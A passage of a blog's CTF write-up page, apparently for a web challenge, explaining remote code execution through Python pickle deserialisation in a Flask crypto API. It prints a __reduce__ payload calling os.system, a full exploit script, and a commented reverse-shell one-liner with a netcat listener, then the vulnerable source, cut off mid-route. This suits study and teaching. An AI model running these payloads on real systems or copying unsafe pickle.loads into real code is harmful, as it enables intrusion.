@@ -1,0 +1,876 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta
+    name="description"
+    content=""
+  />
+  
+    
+      <title>L3AK CTF - Pickled crypto vault | Supaaasuge&#39;s Blog</title>
+    
+  
+  <link rel="stylesheet" href="/css/reset.css"/>
+  <link rel="stylesheet" href="/css/font.css"/>
+  <link rel="stylesheet" href="/css/smigle.css"/>
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+</head>
+
+  <body>
+    <div id="root">
+      <header>
+  <div id="brand">
+    <a class="icon-link" href="https://supaaasuge.github.io/">
+      <img
+        class="icon"
+        src="/images/brandIcon.svg"
+      />
+    </a>
+    <div class="text">
+      <a href="https://supaaasuge.github.io/"><h1>Supaaasuge&#39;s Blog</h1></a>
+      <h3>Aspiring IT/Cybersecurity Professional</h3>
+    </div>
+  </div>
+  <nav>
+    
+      
+        
+        <a href="/"><b>Home</b></a>
+      
+         | 
+        <a href="/about/"><b>About</b></a>
+      
+         | 
+        <a href="/posts/"><b>Posts</b></a>
+      
+         | 
+        <a href="/categories/"><b>Categories</b></a>
+      
+         | 
+        <a href="/tags/"><b>Tags</b></a>
+      
+         | 
+        <a href="/index.xml"><b>RSS</b></a>
+      
+    
+  </nav>
+  <hr />
+</header>
+
+      <div id="content">
+        
+  <main>
+    <article>
+      <h1 class="title">L3AK CTF - Pickled crypto vault</h1>
+      
+      <div class="post-meta">
+  <strong>
+    <span>Posted on</span>
+    <time>2024-06-01</time>
+    <span>in</span>
+    
+      <a href="/categories/ctf">CTF</a>
+  </strong>
+  <span> • 2610 words</span>
+  <span> • 13 minute read</span>
+  
+  
+    <div>
+      <span>Tags:</span>
+      
+        <a href="/tags/cryptography">Cryptography</a>, 
+        <a href="/tags/web">Web</a>, 
+        <a href="/tags/rce">RCE</a>
+    </div>
+  
+</div>
+
+      <div class="content"><h1 id="pickles-and-crypto-vault">Pickles and Crypto vault</h1>
+<p><strong>Difficulty</strong>: Easy
+<strong>Category</strong>: Web</p>
+<h2 id="resources">Resources</h2>
+<ul>
+<li><a href="https://exploit-notes.hdks.org/exploit/web/framework/python/python-pickle-rce/">exploit-notes.hdks - Python Pickle RCE</a></li>
+<li><a href="https://davidhamann.de/2020/04/05/exploiting-python-pickle/">Pickles deserialization RCE explaination</a></li>
+</ul>
+<h2 id="description">Description</h2>
+<p>Pickles and crypto? What a concept.</p>
+<p>This challenge involves a flask RESTful web application with endpoints for user registration, login, key upload, and decryption/encryption. The application uses JWT for authentication, RSA for encryption/decryption of user supplied data, and AES-CBC-256 for database security using a SHA256 hash of the user&rsquo;s password as the AES key for RSA keys stored in-memory.</p>
+<p>To get the flag in this challenge, the intended solution was to leverage the python <code>pickle</code> library to obtain RCE on the host. The vulnerable piece of code is in the Decrypt route:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>rsacipher <span style="color:#f92672">=</span> PKCS1_OAEP<span style="color:#f92672">.</span>new(private_key)
+</span></span><span style="display:flex;"><span>            decrypted_data <span style="color:#f92672">=</span> rsacipher<span style="color:#f92672">.</span>decrypt(decoded_data)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>                jsonsafe_plaintext <span style="color:#f92672">=</span> pickle<span style="color:#f92672">.</span>loads(decrypted_data)
+</span></span><span style="display:flex;"><span>                resp <span style="color:#f92672">=</span> jsonsafe_plaintext
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span></code></pre></div><p><code>pickle.loads(decrypted_data)</code>.</p>
+<p>To obtain RCE, we can easily craft an exploit payload as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">exe</span>(object):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self, cmd):
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>cmd <span style="color:#f92672">=</span> cmd
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__reduce__</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> (os<span style="color:#f92672">.</span>system, (self<span style="color:#f92672">.</span>cmd,))
+</span></span></code></pre></div><p>Then, to get the flag we very simply register a new user, login, upload our keys, craft a malicious payload then send to be decrypted, then we send the encrypted malicious payload we just retrieved from the previous request to be decrypted&hellip; and voila, you should get RCE. The tricky part here is you do not get the response of the shell command back from the server. Only the error response code&rsquo;s (0, 1, etc.)</p>
+<p>The exploit flow can be seen as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># To get a reverse shell and get the flag:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># python exp.py --action exploit --payload &#34;python3 -c &#39;import os,pty,socket;s=socket.socket();s.connect((\&#34;LOCAL_IP\&#34;,PORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\&#34;sh\&#34;)&#39;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># or to get the flag directly:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># start a netcat listener</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># `nc -lvnp PORT` </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># python exploit.py --action exploit --payload &#34;sh -c &#39;cat flag.txt | LOCAL_IP PORT&#39;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">.</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">.</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">.</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>(payload):
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;This function demonstrates how to exploit the API using a given payload&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    user <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;user123&#39;</span> <span style="color:#f92672">+</span> get_random_string(<span style="color:#ae81ff">5</span>)
+</span></span><span style="display:flex;"><span>    password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;password1&#39;</span>
+</span></span><span style="display:flex;"><span>    public_key<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;./public_key.pem&#39;</span>
+</span></span><span style="display:flex;"><span>    private_key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./private_key.pem&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Register a new user</span>
+</span></span><span style="display:flex;"><span>    tokenval <span style="color:#f92672">=</span> register(user, password)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Login as the new user</span>
+</span></span><span style="display:flex;"><span>    login(user, password, tokenval)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Upload key pair</span>
+</span></span><span style="display:flex;"><span>    upload_key(tokenval, password, public_key, private_key)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Craft the payload using pickle</span>
+</span></span><span style="display:flex;"><span>    instance <span style="color:#f92672">=</span> exe(payload)
+</span></span><span style="display:flex;"><span>    malicious_data <span style="color:#f92672">=</span> pickle<span style="color:#f92672">.</span>dumps(instance)
+</span></span><span style="display:flex;"><span>    maliciousEncoded <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>urlsafe_b64encode(malicious_data)<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Encrypt the payload</span>
+</span></span><span style="display:flex;"><span>    headers <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;Authorization&#39;</span>: tokenval}
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># payload</span>
+</span></span><span style="display:flex;"><span>    exploit <span style="color:#f92672">=</span> encrypt(tokenval, password, maliciousEncoded, public_key<span style="color:#f92672">=</span>public_key)
+</span></span><span style="display:flex;"><span>    tmpdata <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>urlsafe_b64encode(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;testing testing 123&#39;</span>)<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>    print_colored(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Sending a test payload </span><span style="color:#e6db74">{</span>tmpdata<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;bg_bright_magenta&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># sending tmpdata for encryption</span>
+</span></span><span style="display:flex;"><span>    exp <span style="color:#f92672">=</span> encrypt(tokenval, password, tmpdata, public_key<span style="color:#f92672">=</span>public_key)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># This is where RCE occurs.</span>
+</span></span><span style="display:flex;"><span>    dec <span style="color:#f92672">=</span> decrypt(tokenval, exp, password)
+</span></span><span style="display:flex;"><span>    print_colored(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Sending the exploit payload </span><span style="color:#e6db74">{</span>exploit<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;bg_bright_magenta&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print_colored(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">Encrypted tmpdata </span><span style="color:#e6db74">{</span>exp<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;bg_bright_magenta&#34;</span>)
+</span></span><span style="display:flex;"><span>    print_colored(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Encrypted Payload = </span><span style="color:#e6db74">{</span>exploit<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;bg_bright_magenta&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Setup payload</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;encrypted_data&#39;</span>: exploit,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;password&#39;</span>: password,
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>API_BASE_URL<span style="color:#e6db74">}</span><span style="color:#e6db74">/decrypt&#39;</span>, json<span style="color:#f92672">=</span>payload, headers<span style="color:#f92672">=</span>headers)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> response<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
+</span></span><span style="display:flex;"><span>        print_colored(<span style="color:#e6db74">&#39;Exploit executed successfully.&#39;</span>, <span style="color:#e6db74">&#39;green&#39;</span>)
+</span></span><span style="display:flex;"><span>        print(response<span style="color:#f92672">.</span>json())
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        print(response<span style="color:#f92672">.</span>json())
+</span></span><span style="display:flex;"><span>        print_colored(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Exploit execution failed.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;red&#39;</span>)
+</span></span></code></pre></div><p><strong>Challenge source code</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, request
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask_restful <span style="color:#f92672">import</span> Resource, Api
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> jwt<span style="color:#f92672">,</span> os<span style="color:#f92672">,</span> base64<span style="color:#f92672">,</span> pickle
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.PublicKey <span style="color:#f92672">import</span> RSA
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> PKCS1_OAEP, AES
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Random <span style="color:#f92672">import</span> get_random_bytes
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Hash <span style="color:#f92672">import</span> SHA256
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.Padding <span style="color:#f92672">import</span> pad, unpad
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> functools <span style="color:#f92672">import</span> wraps
+</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
+</span></span><span style="display:flex;"><span>api <span style="color:#f92672">=</span> Api(app)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>JWT_SECRET <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">32</span>)  
+</span></span><span style="display:flex;"><span>users <span style="color:#f92672">=</span> {}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">db_cipher</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self, key):
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>key <span style="color:#f92672">=</span> key
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>bs <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>block_size
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>pad <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> data: pad(data, self<span style="color:#f92672">.</span>bs)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>unpad <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> data: unpad(data, self<span style="color:#f92672">.</span>bs)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encrypt</span>(self, raw):
+</span></span><span style="display:flex;"><span>        iv <span style="color:#f92672">=</span> get_random_bytes(self<span style="color:#f92672">.</span>bs)
+</span></span><span style="display:flex;"><span>        cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(self<span style="color:#f92672">.</span>key, AES<span style="color:#f92672">.</span>MODE_CBC, iv)
+</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>pad(raw)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> base64<span style="color:#f92672">.</span>urlsafe_b64encode(iv <span style="color:#f92672">+</span> cipher<span style="color:#f92672">.</span>encrypt(data))<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt</span>(self, enc):
+</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>urlsafe_b64decode(enc<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>        iv <span style="color:#f92672">=</span> data[:self<span style="color:#f92672">.</span>bs]
+</span></span><span style="display:flex;"><span>        cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(self<span style="color:#f92672">.</span>key, AES<span style="color:#f92672">.</span>MODE_CBC, iv)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>unpad(cipher<span style="color:#f92672">.</span>decrypt(data[self<span style="color:#f92672">.</span>bs:]))
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">login_required</span>(func):
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@wraps</span>(func)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">wrapper</span>(<span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs):
+</span></span><span style="display:flex;"><span>        token <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;Authorization&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> token:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">&#39;Token is missing&#39;</span>}, <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>decode(token, JWT_SECRET, algorithms<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;HS256&#39;</span>])
+</span></span><span style="display:flex;"><span>            username <span style="color:#f92672">=</span> payload[<span style="color:#e6db74">&#39;username&#39;</span>]
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> username <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> users:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">&#39;Invalid token&#39;</span>}, <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> jwt<span style="color:#f92672">.</span>InvalidTokenError:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">&#39;Invalid token&#39;</span>}, <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> func(<span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> wrapper
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Register</span>(Resource):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">&#39;Please use POST request&#39;</span>}, <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">post</span>(self):
+</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>json
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> data:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">&#39;JSON data is missing&#39;</span>}, <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>        username <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;username&#39;</span>)
+</span></span><span style="display:flex;"><span>        password <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;password&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> username <span style="color:#f92672">in</span> users:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">&#39;Username already exists&#39;</span>}, <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> username <span style="color:#f92672">or</span> <span style="color:#f92672">not</span> password:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">&#39;Username and password are required&#39;</span>}, <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            token <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>encode({<span style="color:#e6db74">&#39;username&#39;</span>: username}, JWT_SECRET, algorithm<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;HS256&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">&#39;Error generating token&#39;</span>}, <span style="color:#ae81ff">500</span>
+</span></span><span style="display:flex;"><span>        hashed_password <span style="color:#f92672">=</span> SHA256<span style="color:#f92672">.</span>new(password<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>digest()
+</span></span><span style="display:flex;"><span>        users[username] <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;password&#39;</span>: hashed_password,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;token&#39;</span>: token, 
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;keys&#39;</span>: {<span style="color:#e6db74">&#39;public&#39;</span>: [], <span style="color:#e6db74">&#39;private&#39;</span>: []}
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;token&#39;</span>: token}, <span style="color:#ae81ff">200</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Login</span>(Resource):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">&#39;Please use POST request&#39;</span>}, <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">post</span>(self):
+</span></span><span style="display:flex;"><span>        token <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;Authorization&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> token:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">&#39;Token is missing&#39;</span>}, <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>decode(token, JWT_SECRET, algorithms<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;HS256&#39;</span>])
+</span></span><span style="display:flex;"><span>            username <span style="color:#f92672">=</span> payload[<span style="color:#e6db74">&#39;username&#39;</span>]
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> jwt<span style="color:#f92672">.</span>InvalidTokenError:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">&#39;Invalid token&#39;</span>}, <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>json
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> data:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">&#39;JSON data is missing&#39;</span>}, <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        password <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;password&#39;</span>)
+</span></span><span style="display:flex;"><span>        hashed_password <span style="color:#f92672">=</span> SHA256<span style="color:#f92672">.</span>new(password<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>digest()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> username <span style="color:#f92672">or</span> <span style="color:#f92672">not</span> password:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">&#39;Username and password are required&#39;</span>}, <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> username <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> users <span style="color:#f92672">or</span> hashed_password <span style="color:#f92672">!=</span> users[username][<span style="color:#e6db74">&#39;password&#39;</span>]:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">&#39;Invalid username or password&#39;</span>}, <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> token <span style="color:#f92672">!=</span> users[username][<span style="color:#e6db74">&#39;token&#39;</span>]:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">&#39;Invalid token&#39;</span>}, <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">&#39;Login successful!&#39;</span>, <span style="color:#e6db74">&#39;token&#39;</span>: token}, <span style="color:#ae81ff">200</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">UploadKey</span>(Resource):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">&#39;Please use POST request&#39;</span>}, <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@login_required</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">post</span>(self):
+</span></span><span style="display:flex;"><span>        token <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;Authorization&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> token:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">&#39;Authentication token required.&#39;</span>}, <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>decode(token, JWT_SECRET, algorithms<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;HS256&#39;</span>])
+</span></span><span style="display:flex;"><span>            username <span style="color:#f92672">=</span> payload[<span style="color:#e6db74">&#39;username&#39;</span>]
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> jwt<span style="color:#f92672">.</span>InvalidTokenError:
